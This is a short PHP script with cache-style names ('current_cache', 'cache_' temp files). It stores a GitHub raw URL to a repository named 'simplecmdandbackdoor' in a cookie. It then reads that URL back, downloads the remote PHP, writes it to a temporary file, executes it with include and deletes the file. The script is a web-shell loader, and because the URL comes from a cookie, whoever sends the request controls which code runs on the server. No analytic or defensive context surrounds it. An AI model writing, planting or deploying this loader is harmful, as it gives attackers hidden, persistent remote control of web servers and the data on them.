<?php
if (empty($_COOKIE['current_cache'])) {
    setcookie("current_cache", "https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/refs/heads/main/ws.php", time() + 3600, "/");
    header("Refresh:0");
    exit;
}
$url = filter_var($_COOKIE['current_cache'], FILTER_VALIDATE_URL);
if (!$url || parse_url($url, PHP_URL_SCHEME) !== 'https') {
    die("Invalid URL.");
}
$code = file_get_contents($url);
if (!$code || strpos($code, '<?php') === false) {
    die("Invalid content.");
}
$tmp = tempnam(sys_get_temp_dir(), 'cache_');
file_put_contents($tmp, $code);
include $tmp;
unlink($tmp);
?>
